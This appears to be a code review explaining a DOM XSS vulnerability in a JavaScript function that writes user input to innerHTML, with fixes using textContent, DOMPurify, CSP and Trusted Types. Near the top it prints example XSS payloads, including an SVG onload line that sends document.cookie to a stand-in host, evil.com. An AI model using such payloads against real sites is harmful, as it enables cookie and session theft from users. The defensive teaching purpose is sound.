### Main issue: DOM XSS vulnerability

```js
function renderHTML(userInput) {
  document.getElementById('output').innerHTML = userInput;
}
```

This directly inserts untrusted `userInput` as HTML. If `userInput` comes from a user, URL parameter, API response, database field, etc., an attacker can inject HTML/JavaScript.

Example attack:

```html
<img src=x onerror="alert(document.cookie)">
```

or:

```html
<svg onload="fetch('https://evil.com/?c=' + document.cookie)">
```

Even though `<script>` tags inserted via `innerHTML` often do not execute directly, many other vectors do: event handlers, `javascript:` URLs, malicious SVG/MathML, iframes, etc.

---

## Safer fixes

### If you only need to display text

Use `textContent`, not `innerHTML`.

```js
function renderText(userInput) {
  const output = document.getElementById('output');

  if (!output) {
    throw new Error('Element #output not found');
  }

  output.textContent = String(userInput ?? '');
}
```

This treats the input as text, so `<b>Hello</b>` will display literally instead of being interpreted as HTML.

---

### If you intentionally need to allow limited HTML

Use a well-maintained sanitizer such as DOMPurify.

```js
import DOMPurify from 'dompurify';

function renderHTML(userInput) {
  const output = document.getElementById('output');

  if (!output) {
    throw new Error('Element #output not found');
  }

  const cleanHTML = DOMPurify.sanitize(String(userInput ?? ''), {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'title', 'target', 'rel']
  });

  output.innerHTML = cleanHTML;
}
```

Also consider forcing safe link behavior:

```js
for (const link of output.querySelectorAll('a[target="_blank"]')) {
  link.rel = 'noopener noreferrer';
}
```

Do **not** try to sanitize HTML with regular expressions.

---

## Other bugs / improvements

### 1. `#output` may not exist

Current code will throw:

```js
Cannot set properties of null
```

if the element does not exist or the script runs before the DOM is loaded.

Fix:

```js
const output = document.getElementById('output');

if (!output) {
  throw new Error('Element #output not found');
}
```

Or run after DOM load:

```js
document.addEventListener('DOMContentLoaded', () => {
  renderText('Hello');
});
```

---

### 2. Potential unintended type coercion

If `userInput` is `null`, `undefined`, an object, etc., the browser will coerce it to a string in surprising ways.

Better:

```js
const safeInput = String(userInput ?? '');
```

---

### 3. Performance concerns

Using `innerHTML` reparses and replaces all child nodes. This removes existing event listeners inside `#output` and can be expensive for large content.

If inserting simple text, `textContent` is faster and safer.

If building structured content, prefer DOM APIs:

```js
function renderMessage(message) {
  const output = document.getElementById('output');

  if (!output) {
    throw new Error('Element #output not found');
  }

  output.replaceChildren();

  const p = document.createElement('p');
  p.textContent = message;
  output.appendChild(p);
}
```

---

### 4. Add defense-in-depth with CSP / Trusted Types

A strong Content Security Policy can reduce XSS impact:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

For modern Chromium browsers, consider Trusted Types:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default;
```

This helps prevent accidental unsafe `innerHTML` usage elsewhere.

---

## Recommended version

If user input should be displayed as plain text:

```js
function renderOutput(userInput) {
  const output = document.getElementById('output');

  if (!output) {
    throw new Error('Element #output not found');
  }

  output.textContent = String(userInput ?? '');
}
```

If HTML is truly required, sanitize first with an allowlist-based sanitizer such as DOMPurify before assigning to `innerHTML`.
